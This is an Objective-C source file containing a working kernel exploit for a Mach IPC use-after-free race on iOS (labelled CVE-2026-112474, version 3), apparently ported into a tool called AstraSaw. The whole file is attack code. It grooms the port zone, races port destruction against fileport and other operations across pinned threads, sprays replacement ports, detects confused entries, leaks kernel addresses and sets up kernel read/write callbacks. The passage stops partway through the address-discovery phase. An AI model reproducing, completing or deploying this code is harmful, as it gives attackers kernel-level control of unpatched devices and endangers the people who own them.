// CVE-2026-112474 IPC Entry UAF Exploit (v3) — ported from Exploit to AstraSaw
//
// Race in Mach IPC entry/port lifetime management.
// In 27.0.1, kernel uses stale entry pointer after space lock re-acquire.
// Port freed between lock drop and re-acquire → stale ptr hits freed/reused memory.
//
// Fixed in 27.2.1: ipc_misc.c adds entry != NULL re-validation.
//
// v3: FILEPORT variant — fileport_makefd() drops space lock during fd allocation.
#import <Foundation/Foundation.h>
#include <mach/mach.h>
#include <pthread.h>
#include <os/lock.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <mach/thread_policy.h>
#include "ipc_uaf.h"

extern int fileport_makeport(int fd, mach_port_t *portnamep);
extern int fileport_makefd(mach_port_t port);

// --- Inline offsets (from Exploit/Core/Offsets.h, iOS 27.0.1 d94ap) ---

#define KERNEL_BASE_UNSLID       0xFFFFFFF007004000ULL
#define IPC_PORT_IP_CONTEXT      0x78

static inline int is_kernel_ptr(uint64_t val) {
    return (val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL &&
           val > 0xFFFFFFF007000000ULL && val < 0xFFFFFFFF00000000ULL;
}

static inline uint64_t reconstruct_kptr(uint32_t truncated, uint64_t slide) {
    if (truncated == 0) return 0;
    uint64_t kbase = KERNEL_BASE_UNSLID + slide;
    uint64_t high = kbase & 0xFFFFFFFF00000000ULL;
    return high | (uint64_t)truncated;
}

// --- Logging ---

static ipc_uaf_log_fn s_log_fn = NULL;
static uint64_t s_kaslr_slide = 0;

static void uaf_log(const char *line) {
    if (s_log_fn) s_log_fn(line);
}

void ipc_uaf_set_log(ipc_uaf_log_fn fn) { s_log_fn = fn; }
void ipc_uaf_set_kaslr_slide(uint64_t slide) { s_kaslr_slide = slide; }

// --- CPU Affinity ---

static void pin_thread_to_cpu(pthread_t thread, int cpu_tag) {
    mach_port_t mthread = pthread_mach_thread_np(thread);
    thread_affinity_policy_data_t policy = { .affinity_tag = cpu_tag };
    thread_policy_set(mthread, THREAD_AFFINITY_POLICY,
                      (thread_policy_t)&policy, THREAD_AFFINITY_POLICY_COUNT);
}

static int g_devnull_fd = -1;

#pragma mark — Zone Grooming (slab-aligned)

#define GROOM_TOTAL  5120
#define GROOM_HOLD   (GROOM_TOTAL - IPC_UAF_SLAB_PORTS)

typedef struct {
    mach_port_t ports[GROOM_TOTAL];
    uint32_t    count;
} zone_groom_t;

static void groom_fill(zone_groom_t *g) {
    g->count = 0;
    for (uint32_t i = 0; i < GROOM_TOTAL; i++) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS)
            break;
        mach_port_set_context(mach_task_self(), p,
                              (mach_port_context_t)(0x4141414100000000ULL | i));
        g->ports[g->count++] = p;
    }
}

static void groom_poke_holes(zone_groom_t *g) {
    uint32_t slab_size = IPC_UAF_SLAB_PORTS;
    uint32_t free_start = g->count >= slab_size ? g->count - slab_size : 0;
    for (uint32_t i = free_start; i < g->count; i++) {
        mach_port_destroy(mach_task_self(), g->ports[i]);
        g->ports[i] = MACH_PORT_NULL;
    }
    g->count = free_start;
}

static void groom_cleanup(zone_groom_t *g) {
    for (uint32_t i = 0; i < g->count; i++) {
        if (g->ports[i] != MACH_PORT_NULL) {
            mach_port_destroy(mach_task_self(), g->ports[i]);
            g->ports[i] = MACH_PORT_NULL;
        }
    }
    g->count = 0;
}

#pragma mark — Race Context

typedef struct {
    volatile bool     go_destroy;
    volatile bool     go_operate;
    volatile bool     destroy_done;
    volatile bool     operate_done;
    volatile bool     stop_spray;
    volatile int      destroy_kr;
    volatile int      operate_kr;
    mach_port_t       target;
    mach_port_t       notify_port;
    uint32_t          variant;
    mach_port_t       replacements[IPC_UAF_REPLACE_PORTS];
    volatile uint32_t replace_count;
} race_ctx_t;

#pragma mark — Destroy Thread

static void *thread_destroy(void *arg) {
    race_ctx_t *ctx = (race_ctx_t *)arg;
    while (!ctx->go_destroy) { __asm__ volatile("yield" ::: "memory"); }
    kern_return_t kr = mach_port_destroy(mach_task_self(), ctx->target);
    ctx->destroy_kr = (int)kr;
    ctx->destroy_done = true;
    __asm__ volatile("dmb ish" ::: "memory");
    return NULL;
}

#pragma mark — Replacement Spray Thread

static void *thread_spray_replace(void *arg) {
    race_ctx_t *ctx = (race_ctx_t *)arg;
    while (!ctx->go_operate && !ctx->stop_spray) {
        __asm__ volatile("yield" ::: "memory");
    }
    if (ctx->stop_spray) return NULL;

    uint32_t n = 0;
    while (!ctx->stop_spray && n < IPC_UAF_REPLACE_PORTS) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) == KERN_SUCCESS) {
            mach_port_insert_right(mach_task_self(), p, p,
                                   MACH_MSG_TYPE_MAKE_SEND);
            ctx->replacements[n++] = p;
            __asm__ volatile("dmb ish" ::: "memory");
        }
    }
    ctx->replace_count = n;
    return NULL;
}

#pragma mark — Operate Threads

static void *thread_op_notify(void *arg) {
    race_ctx_t *ctx = (race_ctx_t *)arg;
    while (!ctx->go_operate) { __asm__ volatile("yield" ::: "memory"); }
    mach_port_t prev = MACH_PORT_NULL;
    kern_return_t kr = mach_port_request_notification(
        mach_task_self(), ctx->target,
        MACH_NOTIFY_NO_SENDERS, 0,
        ctx->notify_port, MACH_MSG_TYPE_MAKE_SEND_ONCE,
        &prev);
    ctx->operate_kr = (int)kr;
    ctx->operate_done = true;
    return NULL;
}

static void *thread_op_insert(void *arg) {
    race_ctx_t *ctx = (race_ctx_t *)arg;
    while (!ctx->go_operate) { __asm__ volatile("yield" ::: "memory"); }
    kern_return_t kr = mach_port_insert_right(
        mach_task_self(), ctx->target,
        ctx->notify_port, MACH_MSG_TYPE_COPY_SEND);
    ctx->operate_kr = (int)kr;
    ctx->operate_done = true;
    return NULL;
}

static void *thread_op_extract(void *arg) {
    race_ctx_t *ctx = (race_ctx_t *)arg;
    while (!ctx->go_operate) { __asm__ volatile("yield" ::: "memory"); }
    mach_port_t extracted = MACH_PORT_NULL;
    mach_msg_type_name_t type = 0;
    kern_return_t kr = mach_port_extract_right(
        mach_task_self(), ctx->target,
        MACH_MSG_TYPE_MOVE_SEND,
        &extracted, &type);
    ctx->operate_kr = (int)kr;
    ctx->operate_done = true;
    if (kr == KERN_SUCCESS && extracted != MACH_PORT_NULL)
        mach_port_deallocate(mach_task_self(), extracted);
    return NULL;
}

typedef struct {
    mach_msg_header_t               header;
    mach_msg_body_t                 body;
    mach_msg_ool_ports_descriptor_t ports_desc;
} ool_msg_t;

static void *thread_op_ool(void *arg) {
    race_ctx_t *ctx = (race_ctx_t *)arg;
    while (!ctx->go_operate) { __asm__ volatile("yield" ::: "memory"); }
    mach_port_t ports[4] = { ctx->target, ctx->target, ctx->target, ctx->target };
    mach_port_t recv = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &recv);
    if (kr != KERN_SUCCESS) {
        ctx->operate_kr = (int)kr;
        ctx->operate_done = true;
        return NULL;
    }
    kr = mach_port_insert_right(mach_task_self(), recv, recv, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        mach_port_deallocate(mach_task_self(), recv);
        ctx->operate_kr = (int)kr;
        ctx->operate_done = true;
        return NULL;
    }
    ool_msg_t msg = {0};
    msg.header.msgh_bits = MACH_MSGH_BITS_COMPLEX |
                           MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg.header.msgh_size = sizeof(msg);
    msg.header.msgh_remote_port = recv;
    msg.body.msgh_descriptor_count = 1;
    msg.ports_desc.address = ports;
    msg.ports_desc.count = 4;
    msg.ports_desc.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.ports_desc.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    kr = mach_msg_send(&msg.header);
    ctx->operate_kr = (int)kr;
    ctx->operate_done = true;
    mach_port_destroy(mach_task_self(), recv);
    return NULL;
}

static void *thread_op_fileport(void *arg) {
    race_ctx_t *ctx = (race_ctx_t *)arg;
    while (!ctx->go_operate) { __asm__ volatile("yield" ::: "memory"); }
    int fd = fileport_makefd(ctx->target);
    if (fd >= 0) {
        ctx->operate_kr = (int)KERN_SUCCESS;
        close(fd);
    } else {
        ctx->operate_kr = (errno == EBADF) ? 0x4 : (int)KERN_FAILURE;
    }
    ctx->operate_done = true;
    return NULL;
}

static void *(*variant_fn(uint32_t v))(void *) {
    switch (v) {
        case 0: return thread_op_notify;
        case 1: return thread_op_insert;
        case 2: return thread_op_extract;
        case 3: return thread_op_ool;
        case 4: return thread_op_fileport;
        default: return NULL;
    }
}

#pragma mark — Entry-Level Corruption Detection

static mach_port_t detect_entry_corruption(mach_port_t *ports, uint32_t count,
                                            char *detail, size_t detail_sz) {
    const mach_port_type_t EXPECTED_TYPE =
        MACH_PORT_TYPE_RECEIVE | MACH_PORT_TYPE_SEND;

    for (uint32_t i = 0; i < count; i++) {
        if (ports[i] == MACH_PORT_NULL) continue;

        mach_port_type_t pt = 0;
        kern_return_t kr = mach_port_type(mach_task_self(), ports[i], &pt);
        if (kr != KERN_SUCCESS) {
            snprintf(detail, detail_sz,
                     "port[%u]=0x%x INVALID kr=0x%x (entry destroyed)",
                     i, ports[i], kr);
            return ports[i];
        }

        if (pt == MACH_PORT_TYPE_DEAD_NAME) {
            snprintf(detail, detail_sz,
                     "port[%u]=0x%x DEAD_NAME (ie_bits overwritten)",
                     i, ports[i]);
            return ports[i];
        }

        if (pt != EXPECTED_TYPE) {
            snprintf(detail, detail_sz,
                     "port[%u]=0x%x type=0x%x expect=0x%x (ie_bits type corrupt)",
                     i, ports[i], pt, EXPECTED_TYPE);
            return ports[i];
        }

        mach_port_urefs_t sr = 0;
        kr = mach_port_get_refs(mach_task_self(), ports[i],
                                 MACH_PORT_RIGHT_SEND, &sr);
        if (kr == KERN_SUCCESS && sr != 1) {
            snprintf(detail, detail_sz,
                     "port[%u]=0x%x send_refs=%u (expected 1, ie_bits send corrupt)",
                     i, ports[i], sr);
            return ports[i];
        }

        mach_port_status_t st = {0};
        mach_msg_type_number_t cnt = MACH_PORT_RECEIVE_STATUS_COUNT;
        kr = mach_port_get_attributes(mach_task_self(), ports[i],
                                       MACH_PORT_RECEIVE_STATUS,
                                       (mach_port_info_t)&st, &cnt);
        if (kr == KERN_SUCCESS &&
            (st.mps_nsrequest || st.mps_sorights > 0 ||
             st.mps_msgcount > 0 || st.mps_seqno > 0 ||
             st.mps_mscount > 0)) {
            snprintf(detail, detail_sz,
                     "port[%u]=0x%x ns=%d so=%u msg=%u seq=%u ms=%u (port state corrupt)",
                     i, ports[i], st.mps_nsrequest,
                     st.mps_sorights, st.mps_msgcount,
                     st.mps_seqno, st.mps_mscount);
            return ports[i];
        }
    }

    detail[0] = '\0';
    return MACH_PORT_NULL;
}

#pragma mark — Calibration

typedef struct {
    uint32_t variant;
    uint32_t overlap;
    uint32_t confused;
    uint32_t op_fail;
    uint32_t attempts;
} cal_result_t;

static cal_result_t calibrate(uint32_t variant, uint32_t iters) {
    cal_result_t r = { .variant = variant, .attempts = iters };
    void *(*op_fn)(void *) = variant_fn(variant);
    if (!op_fn) return r;

    for (uint32_t i = 0; i < iters; i++) {
        mach_port_t target = MACH_PORT_NULL, notify = MACH_PORT_NULL;
        kern_return_t kr;

        if (variant == 4) {
            if (fileport_makeport(g_devnull_fd, &target) != 0) continue;
        } else {
            kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &target);
            if (kr != KERN_SUCCESS) continue;
            kr = mach_port_insert_right(mach_task_self(), target, target,
                                        MACH_MSG_TYPE_MAKE_SEND);
            if (kr != KERN_SUCCESS) {
                mach_port_deallocate(mach_task_self(), target);
                continue;
            }
            kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notify);
            if (kr != KERN_SUCCESS) {
                mach_port_destroy(mach_task_self(), target);
                continue;
            }
            kr = mach_port_insert_right(mach_task_self(), notify, notify,
                                        MACH_MSG_TYPE_MAKE_SEND);
            if (kr != KERN_SUCCESS) {
                mach_port_deallocate(mach_task_self(), notify);
                mach_port_destroy(mach_task_self(), target);
                continue;
            }
        }

        race_ctx_t ctx;
        memset(&ctx, 0, sizeof(ctx));
        ctx.target = target;
        ctx.notify_port = notify;
        ctx.variant = variant;

        pthread_t td, to, ts;
        pthread_create(&ts, NULL, thread_spray_replace, &ctx);
        pthread_create(&to, NULL, op_fn, &ctx);
        pthread_create(&td, NULL, thread_destroy, &ctx);
        pin_thread_to_cpu(td, 1);
        pin_thread_to_cpu(to, 1);
        pin_thread_to_cpu(ts, 1);
        usleep(5);
        ctx.go_operate = true;
        __asm__ volatile("dmb ish" ::: "memory");
        if (variant == 4) {
            for (volatile int d = 0; d < 50; d++) {}
        }
        ctx.go_destroy = true;
        __asm__ volatile("dmb ish" ::: "memory");
        pthread_join(td, NULL);
        pthread_join(to, NULL);
        ctx.stop_spray = true;
        pthread_join(ts, NULL);

        if (ctx.destroy_done && ctx.operate_kr == KERN_SUCCESS) {
            r.overlap++;
        } else if (ctx.destroy_done) {
            r.op_fail++;
        }

        if (ctx.destroy_done && ctx.replace_count > 0) {
            char det[128];
            if (detect_entry_corruption(ctx.replacements, ctx.replace_count,
                                        det, sizeof(det)) != MACH_PORT_NULL)
                r.confused++;
        }

        for (uint32_t j = 0; j < ctx.replace_count; j++)
            if (ctx.replacements[j] != MACH_PORT_NULL)
                mach_port_destroy(mach_task_self(), ctx.replacements[j]);
        if (notify != MACH_PORT_NULL)
            mach_port_destroy(mach_task_self(), notify);
        if (!ctx.destroy_done)
            mach_port_destroy(mach_task_self(), target);
    }
    return r;
}

#pragma mark — Port kaddr Leak

static uint64_t leak_port_kaddr(mach_port_t port) {
    mach_port_context_t ctx = 0;
    kern_return_t kr = mach_port_get_context(mach_task_self(), port, &ctx);
    if (kr == KERN_SUCCESS && ctx != 0) {
        uint64_t val = (uint64_t)ctx;
        if (is_kernel_ptr(val)) return val;
    }
    return 0;
}

#pragma mark — Dual-Name kR/W Callbacks

static mach_port_t s_confused_name = MACH_PORT_NULL;
static mach_port_t s_replacement_name = MACH_PORT_NULL;

uint64_t ipc_uaf_kread64(uint64_t addr) {
    kern_return_t kr = mach_port_set_context(
        mach_task_self(), s_replacement_name,
        (mach_port_context_t)addr);
    if (kr != KERN_SUCCESS) return 0;
    mach_port_context_t val = 0;
    kr = mach_port_get_context(mach_task_self(), s_confused_name, &val);
    if (kr != KERN_SUCCESS) return 0;
    return (uint64_t)val;
}

bool ipc_uaf_kwrite64(uint64_t addr, uint64_t val) {
    (void)addr;
    kern_return_t kr = mach_port_set_context(
        mach_task_self(), s_replacement_name,
        (mach_port_context_t)val);
    return (kr == KERN_SUCCESS);
}

#pragma mark — Main Entry

void ipc_uaf_run(ipc_uaf_result_t *result) {
    memset(result, 0, sizeof(*result));
    char msg[512];

    uaf_log("[IPCUAF] === CVE-2026-112474 v3: fileport race (IKOT_FILEPORT) ===");
    uaf_log("[IPCUAF] strategy: fileport_makefd race → fd alloc widens window → detect confusion");

    if (g_devnull_fd < 0) {
        g_devnull_fd = open("/dev/null", O_RDONLY);
        if (g_devnull_fd < 0) {
            uaf_log("[IPCUAF] ✗ cannot open /dev/null");
            return;
        }
    }

    // ——— Outer retry: re-groom + re-calibrate if confused port is INACTIVE ———
    bool found_active = false;
    uint32_t total_inactive = 0;
    zone_groom_t groom = {0};
    mach_port_t confused_port = MACH_PORT_NULL;

    for (uint32_t outer = 0; outer < IPC_UAF_MAX_OUTER_RETRIES && !found_active; outer++) {
        if (outer > 0) {
            groom_cleanup(&groom);
            memset(&groom, 0, sizeof(groom));
            snprintf(msg, sizeof(msg),
                     "[IPCUAF] ═══ OUTER RETRY %u/%u (inactive_total=%u) ═══",
                     outer + 1, IPC_UAF_MAX_OUTER_RETRIES, total_inactive);
            uaf_log(msg);
        }

    // ——— Phase 1: Zone Grooming ———
    uaf_log("[IPCUAF] phase 1: zone grooming");
    groom_fill(&groom);
    snprintf(msg, sizeof(msg), "[IPCUAF] groom: %u ports allocated", groom.count);
    uaf_log(msg);
    groom_poke_holes(&groom);
    snprintf(msg, sizeof(msg), "[IPCUAF] groom: holding %u, freed %u holes",
             groom.count, GROOM_TOTAL - GROOM_HOLD);
    uaf_log(msg);

    // ——— Phase 2: Calibration ———
    uaf_log("[IPCUAF] phase 2: calibrating race variants");

    const char *vnames[] = { "notify", "insert", "extract", "ool_send", "fileport" };
    cal_result_t best = {0};

    for (uint32_t v = 0; v < IPC_UAF_NOTIFY_VARIANTS; v++) {
        cal_result_t c = calibrate(v, 200);
        double rate = c.attempts > 0 ? (double)c.overlap / c.attempts * 100.0 : 0.0;
        snprintf(msg, sizeof(msg),
                 "[IPCUAF] cal[%u] %s: overlap=%u/%u (%.1f%%) confused=%u fail=%u",
                 v, vnames[v], c.overlap, c.attempts, rate, c.confused, c.op_fail);
        uaf_log(msg);

        if (c.confused > best.confused ||
            (c.confused == best.confused && c.overlap > best.overlap))
            best = c;
    }

    if (best.overlap == 0) {
        if (outer == 0) {
            uaf_log("[IPCUAF] ✗ zero overlap on first attempt — kernel may have fix active");
            groom_cleanup(&groom);
            return;
        }
        uaf_log("[IPCUAF] ✗ zero overlap this round — retrying with fresh groom");
        continue;
    }

    snprintf(msg, sizeof(msg), "[IPCUAF] best: %s (overlap=%u confused=%u)",
             vnames[best.variant], best.overlap, best.confused);
    uaf_log(msg);
    result->winning_variant = best.variant;

    // ——— Phase 3: UAF Trigger ———
    uaf_log("[IPCUAF] phase 3: triggering UAF");

    void *(*op_fn)(void *) = variant_fn(best.variant);
    bool confirmed = false;
    confused_port = MACH_PORT_NULL;
    uint32_t n_overlap = 0, n_fail = 0, n_invalid_name = 0;

    for (uint32_t att = 0; att < IPC_UAF_RACE_ITERATIONS && !confirmed; att++) {
        result->race_attempts++;

        mach_port_t target = MACH_PORT_NULL, ns_port = MACH_PORT_NULL;
        kern_return_t kr;

        if (best.variant == 4) {
            if (fileport_makeport(g_devnull_fd, &target) != 0) continue;
        } else {
            kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &target);
            if (kr != KERN_SUCCESS) continue;
            kr = mach_port_insert_right(mach_task_self(), target, target,
                                        MACH_MSG_TYPE_MAKE_SEND);
            if (kr != KERN_SUCCESS) {
                mach_port_deallocate(mach_task_self(), target);
                continue;
            }
            kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ns_port);
            if (kr != KERN_SUCCESS) {
                mach_port_destroy(mach_task_self(), target);
                continue;
            }
            kr = mach_port_insert_right(mach_task_self(), ns_port, ns_port,
                                        MACH_MSG_TYPE_MAKE_SEND);
            if (kr != KERN_SUCCESS) {
                mach_port_deallocate(mach_task_self(), ns_port);
                mach_port_destroy(mach_task_self(), target);
                continue;
            }
            mach_port_t prev = MACH_PORT_NULL;
            mach_port_request_notification(mach_task_self(), target,
                                           MACH_NOTIFY_NO_SENDERS, 1,
                                           ns_port, MACH_MSG_TYPE_MAKE_SEND_ONCE,
                                           &prev);
        }

        race_ctx_t ctx;
        memset(&ctx, 0, sizeof(ctx));
        ctx.target = target;
        ctx.notify_port = ns_port;
        ctx.variant = best.variant;

        pthread_t td, to, ts;
        pthread_create(&ts, NULL, thread_spray_replace, &ctx);
        pthread_create(&to, NULL, op_fn, &ctx);
        pthread_create(&td, NULL, thread_destroy, &ctx);
        pin_thread_to_cpu(td, 1);
        pin_thread_to_cpu(to, 1);
        pin_thread_to_cpu(ts, 1);
        usleep(3 + (att & 0x7));
        ctx.go_operate = true;
        __asm__ volatile("dmb ish" ::: "memory");
        if (best.variant == 4) {
            for (volatile int d = 0; d < 50; d++) {}
        }
        ctx.go_destroy = true;
        __asm__ volatile("dmb ish" ::: "memory");

        pthread_join(td, NULL);
        pthread_join(to, NULL);
        ctx.stop_spray = true;
        pthread_join(ts, NULL);

        if (ctx.destroy_done && ctx.operate_kr == KERN_SUCCESS) {
            n_overlap++;
            result->race_wins++;
        } else if (ctx.destroy_done) {
            n_fail++;
            if (ctx.operate_kr == 0x4 || ctx.operate_kr == 0x100)
                n_invalid_name++;
        }

        if (ctx.destroy_done && ctx.replace_count > 0) {
            char det[256];
            mach_port_t cp = detect_entry_corruption(
                ctx.replacements, ctx.replace_count, det, sizeof(det));

            if (cp != MACH_PORT_NULL) {
                confused_port = cp;

                snprintf(msg, sizeof(msg),
                         "[IPCUAF] UAF candidate att=%u op_kr=0x%x %s",
                         att, ctx.operate_kr, det);
                uaf_log(msg);

                uint64_t kaddr = leak_port_kaddr(cp);
                if (kaddr) {
                    snprintf(msg, sizeof(msg),
                             "[IPCUAF] candidate kaddr: 0x%llx", kaddr);
                    uaf_log(msg);
                }

                for (uint32_t j = 0; j < ctx.replace_count; j++) {
                    if (ctx.replacements[j] == cp)
                        ctx.replacements[j] = MACH_PORT_NULL;
                }

                // ——— ACTIVE validation ———
                mach_port_context_t active_test = 0;
                kern_return_t active_kr = mach_port_get_context(
                    mach_task_self(), confused_port, &active_test);

                if (active_kr != KERN_SUCCESS) {
                    total_inactive++;
                    snprintf(msg, sizeof(msg),
                             "[IPCUAF] ⚠ port 0x%x INACTIVE (kr=0x%x) — %u/%u",
                             confused_port, active_kr,
                             total_inactive, IPC_UAF_MAX_ACTIVE_RETRIES);
                    uaf_log(msg);

                    mach_port_destroy(mach_task_self(), confused_port);
                    confused_port = MACH_PORT_NULL;

                    for (uint32_t j = 0; j < ctx.replace_count; j++) {
                        if (ctx.replacements[j] != MACH_PORT_NULL)
                            mach_port_destroy(mach_task_self(), ctx.replacements[j]);
                    }
                    if (ns_port != MACH_PORT_NULL)
                        mach_port_destroy(mach_task_self(), ns_port);

                    if (total_inactive >= IPC_UAF_MAX_ACTIVE_RETRIES) {
                        uaf_log("[IPCUAF] ✗ ACTIVE retry limit hit");
                        break;
                    }
                    continue;
                }

                // ★ Port is ACTIVE — ip_context echo confirmed
                confirmed = true;
                found_active = true;
                result->uaf_triggered = true;
                result->replacement_confirmed = true;
                result->port_active = true;
                result->active_retries = total_inactive;
                result->dangling_port_kaddr = kaddr;

                snprintf(msg, sizeof(msg),
                         "[IPCUAF] ★★★ ACTIVE PORT 0x%x ctx=0x%llx kaddr=0x%llx (inactive_before=%u)",
                         confused_port, (uint64_t)active_test, kaddr, total_inactive);
                uaf_log(msg);

                for (uint32_t j = 0; j < ctx.replace_count; j++) {
                    if (ctx.replacements[j] != MACH_PORT_NULL)
                        mach_port_destroy(mach_task_self(), ctx.replacements[j]);
                }
                if (ns_port != MACH_PORT_NULL)
                    mach_port_destroy(mach_task_self(), ns_port);
                break;
            }
        }

        if (!ctx.destroy_done)
            mach_port_destroy(mach_task_self(), target);
        for (uint32_t j = 0; j < ctx.replace_count; j++)
            if (ctx.replacements[j] != MACH_PORT_NULL)
                mach_port_destroy(mach_task_self(), ctx.replacements[j]);
        if (ns_port != MACH_PORT_NULL)
            mach_port_destroy(mach_task_self(), ns_port);

        if (att % 2000 == 0) {
            snprintf(msg, sizeof(msg),
                     "[IPCUAF] race: %u/%u olap=%u fail=%u invn=%u inact=%u",
                     att, IPC_UAF_RACE_ITERATIONS, n_overlap, n_fail,
                     n_invalid_name, total_inactive);
            uaf_log(msg);
        }
        if (att % 4000 == 0 && att > 0) {
            snprintf(msg, sizeof(msg),
                     "[IPCUAF] progress: %u/%u overlap=%u fail=%u invn=%u spray=%u",
                     att, IPC_UAF_RACE_ITERATIONS, n_overlap, n_fail,
                     n_invalid_name, ctx.replace_count);
            uaf_log(msg);
        }
    }

    result->race_win_rate = result->race_attempts > 0 ?
        (double)result->race_wins / (double)result->race_attempts : 0.0;

    snprintf(msg, sizeof(msg),
             "[IPCUAF] race: %u att, %u overlap (%.2f%%), %u fail, %u invn",
             result->race_attempts, n_overlap,
             result->race_win_rate * 100.0, n_fail, n_invalid_name);
    uaf_log(msg);

    if (!confirmed) {
        snprintf(msg, sizeof(msg),
                 "[IPCUAF] ✗ round %u/%u: %u olap, %u fail, %u inactive — no ACTIVE port",
                 outer + 1, IPC_UAF_MAX_OUTER_RETRIES,
                 n_overlap, n_fail, total_inactive);
        uaf_log(msg);
        if (total_inactive >= IPC_UAF_MAX_ACTIVE_RETRIES) break;
        continue;
    }

    } // ——— end outer retry loop ———

    if (!found_active) {
        snprintf(msg, sizeof(msg),
                 "[IPCUAF] ✗ FAILED: %u outer attempts, %u INACTIVE ports — no usable primitive",
                 IPC_UAF_MAX_OUTER_RETRIES, total_inactive);
        uaf_log(msg);
        result->active_retries = total_inactive;
        groom_cleanup(&groom);
        return;
    }

    // ——— Phase 4: Characterize Entry Corruption ———
    uaf_log("[IPCUAF] phase 4: characterize corruption");
    {
        mach_port_type_t cp_type = 0;
        kern_return_t kr = mach_port_type(mach_task_self(), confused_port, &cp_type);
        if (kr != KERN_SUCCESS) {
            snprintf(msg, sizeof(msg),
                     "[IPCUAF] corrupted port 0x%x → INVALID (entry destroyed). kr=0x%x",
                     confused_port, kr);
            uaf_log(msg);
        } else {
            mach_port_urefs_t sr = 0, rr = 0;
            mach_port_get_refs(mach_task_self(), confused_port,
                               MACH_PORT_RIGHT_SEND, &sr);
            mach_port_get_refs(mach_task_self(), confused_port,
                               MACH_PORT_RIGHT_RECEIVE, &rr);
            mach_port_status_t pst = {0};
            mach_msg_type_number_t pst_cnt = MACH_PORT_RECEIVE_STATUS_COUNT;
            mach_port_get_attributes(mach_task_self(), confused_port,
                                     MACH_PORT_RECEIVE_STATUS,
                                     (mach_port_info_t)&pst, &pst_cnt);
            mach_port_context_t pctx = 0;
            mach_port_get_context(mach_task_self(), confused_port, &pctx);

            snprintf(msg, sizeof(msg),
                     "[IPCUAF] corrupted port 0x%x: type=0x%x sr=%u rr=%u "
                     "ctx=0x%llx seq=%u ms=%u ql=%u msg=%u so=%u ns=%d",
                     confused_port, cp_type, sr, rr, (uint64_t)pctx,
                     pst.mps_seqno, pst.mps_mscount, pst.mps_qlimit,
                     pst.mps_msgcount, pst.mps_sorights, pst.mps_nsrequest);
            uaf_log(msg);
        }
        if (s_kaslr_slide != 0) {
            snprintf(msg, sizeof(msg),
                     "[IPCUAF] KASLR slide=0x%llx — combining with entry corruption for kR/W",
                     s_kaslr_slide);
            uaf_log(msg);
        }
    }

    // ——— Phase 4.5: kaddr Discovery via mach_port_space_info ———
    uaf_log("[IPCUAF] ═══ Phase 4.5: Port kaddr discovery ═══");

    uint64_t confused_kaddr = 0;
    uint32_t kaddr_source = 0;

    // Method A: ip_context residue
    {
        mach_port_context_t pctx = 0;
        kern_return_t kr = mach_port_get_context(mach_task_self(),
                                                  confused_port, &pctx);
        if (kr == KERN_SUCCESS && pctx != 0) {
            uint64_t val = (uint64_t)pctx;
            if (is_kernel_ptr(val)) {
                confused_kaddr = val;
                kaddr_source = 1;
                snprintf(msg, sizeof(msg),
                         "[IPCUAF] ★ ip_context kptr: 0x%llx (stale path residue)", val);
                uaf_log(msg);
            } else {
                snprintf(msg, sizeof(msg),
                         "[IPCUAF] ip_context=0x%llx (not kptr)", val);
                uaf_log(msg);
            }
        } else {
            uaf_log("[IPCUAF] ip_context=0 or get_context failed");
        }
    }

    // Method B: mach_port_space_info → iin_object
    if (confused_kaddr == 0) {
        ipc_info_space_t space_info = {0};
        ipc_info_name_array_t name_array = NULL;
        mach_msg_type_number_t name_count = 0;
        ipc_info_tree_name_array_t tree_array = NULL;
        mach_msg_type_number_t tree_count = 0;

        kern_return_t kr = mach_port_space_info(
            mach_task_self(), &space_info,
            &name_array, &name_count,
            &tree_array, &tree_count);

        if (kr == KERN_SUCCESS && name_array != NULL) {
            snprintf(msg, sizeof(msg),
                     "[IPCUAF] space_info: %u entries, table_size=%u",
                     name_count, space_info.iis_table_size);
            uaf_log(msg);

            uint32_t nonzero_obj = 0, kptr_obj = 0;
            uint64_t confused_iin = 0;

            for (mach_msg_type_number_t i = 0; i < name_count; i++) {
                ipc_info_name_t *e = &name_array[i];
                if (e->iin_object != 0) {
                    nonzero_obj++;
                    uint64_t reconstructed = reconstruct_kptr(
                        (uint32_t)e->iin_object, s_kaslr_slide);
                    if (is_kernel_ptr(reconstructed)) kptr_obj++;

                    if (e->iin_name == confused_port) {
                        confused_iin = reconstructed;
                        snprintf(msg, sizeof(msg),
                                 "[IPCUAF] ★ confused port iin_object=0x%x → 0x%llx",
                                 (uint32_t)e->iin_object, reconstructed);
                        uaf_log(msg);
                    }
                    if (nonzero_obj <= 5) {
                        snprintf(msg, sizeof(msg),
                                 "[IPCUAF] iin[%u] name=0x%x obj=0x%x→0x%llx type=0x%x",
                                 i, e->iin_name, (uint32_t)e->iin_object,
                                 reconstructed, e->iin_type);
                        uaf_log(msg);
                    }
                }
            }

            snprintf(msg, sizeof(msg),
                     "[IPCUAF] space_info: nonzero_obj=%u kptr_obj=%u",
                     nonzero_obj, kptr_obj);
            uaf_log(msg);

            if (confused_iin != 0 && is_kernel_ptr(confused_iin)) {
                confused_kaddr = confused_iin;
                kaddr_source = 2;
            }

            if (name_array) {
                vm_deallocate(mach_task_self(),
                              (vm_address_t)name_array,
                              name_count * sizeof(ipc_info_name_t));
            }
            if (tree_array) {
                vm_deallocate(mach_task_self(),
                              (vm_address_t)tree_array,
                              tree_count * sizeof(ipc_info_tree_name_t));
            }
        } else {
            snprintf(msg, sizeof(msg),
                     "[IPCUAF] space_info failed: kr=0x%x", kr);
            uaf_log(msg);
        }
    }

    // Method C: MIG probe not ported — log and skip
    if (confused_kaddr == 0) {
        uaf_log("[IPCUAF] MIG probe not available in AstraSaw — skipped");
    }

